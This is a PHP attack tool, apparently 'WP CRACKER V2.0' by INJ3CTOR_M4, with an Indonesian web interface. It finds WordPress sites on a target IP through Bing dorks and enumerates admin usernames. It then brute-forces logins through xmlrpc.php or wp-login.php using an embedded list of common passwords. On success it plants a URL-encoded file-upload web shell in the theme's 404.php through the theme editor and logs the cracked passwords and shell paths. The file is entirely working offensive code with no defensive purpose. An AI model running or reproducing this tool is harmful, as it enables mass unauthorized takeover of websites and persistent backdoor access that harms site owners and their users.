<?php
include 'head.php';
?>
<center>
<table cellpadding='5'>
<tr><td align=center><h2>WP BRUTER </h2></td></tr>
<?php
#WP CRACKER V2.0
#INJ3CTOR_M4
@set_time_limit(0);
error_reporting(0);

if(!isset($_POST['brute'])){
	echo'<tr><td align="center">';
	
	echo'<form method="POST">';
	echo'<div class="form-group">';
    echo'  <label for="comment">Masukan IP Server Untuk NgeGrab IP Situs:</label>';
	echo'<input class="form-control" type="text" name="ip" placeholder="Masukan IP Target">';
	echo'<input class="btn btn-info btn-md" type="submit" value="Grap IP WP!"></td></tr></table>';
	echo'<table cellpadding="5">';
	echo'<tr><td align="center"><b>Web-Sites List</b></td><td align="center"><b>Passwords</b></td></tr>';
	if(!isset($_POST['ip'])){
		echo'<tr><td align="center"><textarea  class="form-control" name="sites" cols="32" rows="23" placeholder="http://localhost/"></textarea></td></br>';
	}else{
		$ip = trim($_POST['ip']);
		$dorks = array('/?page_id=', '/?p=');
		foreach($dorks as $dork){
			$query = "ip:$ip $dork";
			$allLinks = bingServerCrawler($query);
			foreach($allLinks as $link){
				if(eregi("page_id=|p=", $link)){	$link = pathinfo($link)['dirname'];
					$data = get_source($link	.	"/wp-includes/wlwmanifest.xml");
					if(preg_match('#<clientType>WordPress</clientType>#i', $data)){
						$wpLinks[] = $link;
					}
				}
			}
		}
		if(!empty($wpLinks)){	$wpLinks = array_unique($wpLinks);
			echo'<tr><td align="center"><textarea name="sites" cols="32" rows="23">';
			foreach($wpLinks as $wordpress){
				echo $wordpress	."\r\n";
			}
			echo'</textarea></td>';
		}
	}
	echo'<td><textarea class="form-control" name="passwords" cols="32" rows="23">';
echo'
00000
000000
0000000
00000000
0123456789
102030
111111
112233
123
123123
12345
123456
1234567
12345678
123456789
321321
654321
admin
adminadmin
admin123
admin123123
admin1234
admin123456
administrator
abc123
demo
qwerty
qwerty123
passwd
password
p@ssw0rd
passw0rd
passwords
pass123
pass121
pass
pass1234
test
test123
root
toor
user
welcome1
welcome
';
	echo'</textarea></td></tr></table>';
	echo'<table cellpadding="5">';
	echo'<tr><td align="center"></br><input class="btn btn-info btn-md" type="submit" name="brute" value="Start BruteForce!"/></form></td></tr></table>';
	include 'foot.php';
}else{
	$sites = array_unique(array_map("trim", explode("\r\n", $_POST['sites'])));
	$passwords = array_unique(array_map("trim", explode("\r\n", $_POST['passwords'])));
	$f = fopen('rezult.html', 'a+');
	echo'<table border="1" cellpadding="5">';
	foreach($sites as $site){
		$site = rtrim($site, '/');
		vbflush(); # buffer clean
		echo"<tr><td><b>Target --> $site</b></td></tr>";
		fwrite($f, "<br />target --> <b>$site</b><br />");
		$user = admin_wp($site);
		echo"<tr><td>Username is: <b>$user</b></td>";
		fwrite($f, "Username: <b>$user</b><br />");
		foreach($passwords as $pass){
			if(WP_CRACKER($site, $user,$pass) == true){
				vbflush(); # buffer clean
				echo"<tr><td><b><font color='green'>Password is: $pass</font></b></td></tr>";
				fwrite($f, "Password: <b>$pass</b><br />");
				if(uploadshell($site) == true){
					echo"<tr><td><b><font color='green'>Shell Uploaded: $site/wp-content/themes/twentythirteen/404.php</font></b></td></tr>";
					fwrite($f, "Shell: <b>$site/wp-content/themes/twentythirteen/404.php</b><br />");
				}else{
					echo'<tr><td><font color="red">Can\'t Upload Shell!</font></td></tr>';
				}
				break;
			}else{
				vbflush(); # buffer clean
				echo"<tr><td><font color='red'>$pass NO!</font></td></tr>";
			}
		}
	}
	fclose($f);
}
echo'</table>';

// Functions //

function bingServerCrawler($dork){
	$ch = curl_init();
	$i = 1;
	while($i){
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_URL, "http://www.bing.com/search?q="	.	urlencode($dork)	.	"&first={$i}");
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_USERAGENT, "SamsungI8910/SymbianOS/9.1 Series60/3.0");
		curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, compress");
		$data = curl_exec($ch);
		preg_match_all('#<h2 class="sb_h3 cttl"><a href="(.*?)"#i', $data, $matches);
		foreach($matches[1] as $link){
			$allLinks[] = $link;
		}
		if(!preg_match('#class="sb_pagN"#i', $data)) break;
		$i+=10;
	}
	curl_close($ch);
	if(!empty($allLinks) && is_array($allLinks)){
		return array_unique($allLinks);
	}
}

function get_source($link, $safemode = false, $agent){
	if($safemode === true) sleep(1);
	if(!$agent){ $agent='Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'; }
	if(!function_exists('curl_init')){
		return file_get_contents($link);
	}else{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_URL, $link);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, $agent);
		curl_setopt($ch, CURLOPT_ENCODING, 0);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		$data = curl_exec($ch);
		curl_close($ch);
		
		return $data;
	}
}

function admin_wp($wp){
    $data = get_source($wp    .    "/?feed=atom");
    if(preg_match('#<name>(.*?)</name>#', $data, $user)){
        if(strlen($user[1]) > 0 && strlen($user[1]) <= 15){
            return $user[1];
        }
    }else{
        $data = get_source($wp    .    "/?author=1");
        if(preg_match('#<body class="archive author author-(.*?) author-(.*?)(.*)">#i', $data, $user)){
            return $user[1];
        }else{
            return "admin";
        }
    }
}

function WP_CRACKER($site, $user, $pass){
	$xmlprc = get_source($site	.'/xmlrpc.php');
	$ch = curl_init();
	if(preg_match('#server accepts POST#i', $xmlprc)){
		curl_setopt($ch, CURLOPT_URL, $site    ."/xmlrpc.php");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		$data = curl_exec($ch);
		return (preg_match('#<name>isAdmin</name>#i', $data)) ? true:false;
	}else{
		curl_setopt($ch, CURLOPT_URL, $site	.'/wp-login.php');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
		curl_setopt($ch, CURLOPT_COOKIE, "wordpress_test_cookie=WP+Cookie+check");
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "log={$user}&pwd={$pass}&wp-submit=Log+In&redirect_to={$site}/wp-admin/&testcookie=1");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		$data = curl_exec($ch);
		return (preg_match('/logout/', $data)) ? true:false;
	}
}

function uploadshell($site){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $site    .'/wp-admin/theme-editor.php?file=404.php&theme=twentythirteen');
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$data = curl_exec($ch);
	curl_close($ch);
	if(preg_match('#name="_wpnonce" value="(.*?)"#', $data, $token)){
		$post = "_wpnonce={$token[1]}&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3Dtwentythirteen%26scrollto%3D0%26updated%3Dtrue&newcontent=%3C%3Fphp%0Aecho%20%27Uploader%20By%20INJ3CTOR_M4%27%3B%0Aecho%27%0A%3Cform%20method%3D%22post%22%20enctype%3D%22multipart%2fform-data%22%3E%0A%3Cinput%20name%3D%22file%22%20type%3D%22file%22%20%2f%3E%0A%3Cinput%20name%3D%22path%22%20type%3D%22text%22%20value%3D%22%27.getcwd%28%29.%27%22%20%2f%3E%0A%3Cinput%20type%3D%22submit%22%20value%3D%22Up%22%20%2f%3E%0A%3C%2fform%3E%0A%27%3B%0Aif%28isset%28%24_FILES%5B%27file%27%5D%29%20%26%26%20isset%28%24_POST%5B%27path%27%5D%29%29%7B%0A%20%20%20%20if%28move_uploaded_file%28%24_FILES%5B%27file%27%5D%5B%27tmp_name%27%5D%2C%24_POST%5B%27path%27%5D.%27%2f%27.%24_FILES%5B%27file%27%5D%5B%27name%27%5D%29%29%7B%0A%20%20%20%20%20%20%20%20echo%20%27%3Cfont%20color%3D%22green%22%3EFile%20Upload%20Done.%3C%2ffont%3E%3Cbr%20%2f%3E%27%3B%0A%20%20%20%20%7Delse%7B%0A%20%20%20%20%20%20%20%20echo%20%27%3Cfont%20color%3D%22red%22%3EFile%20Upload%20Error.%3C%2ffont%3E%3Cbr%20%2f%3E%27%3B%0A%20%20%20%20%7D%0A%7D%0A%3F%3E&action=update&file=404.php&theme=twentythirteen&scrollto=0&docs-list=&submit=Update+File";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $site    .'/wp-admin/theme-editor.php');
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$data = curl_exec($ch);
		curl_close($ch);
		$data = get_source($site	.'/wp-content/themes/twentythirteen/404.php');
		return (preg_match('/Uploader By INJ3CTOR_M4/', $data)) ? true:false;
	}else{	return FALSE;	}
}
		
function vbflush(){
	static $gzip_handler = null;
	if($gzip_handler === null){
		$gzip_handler = false;
		$output_handlers = ob_list_handlers();
		if(is_array($output_handlers)){
			foreach($output_handlers as $handler){
				if($handler == 'ob_gzhandler'){
					$gzip_handler = true;
					break;
				}
			}
		}
	}
	if($gzip_handler){
	// forcing a flush with this is very bad
		return;
	}
	if(ob_get_length() !== false){
		@ob_flush();
	}
	flush();
}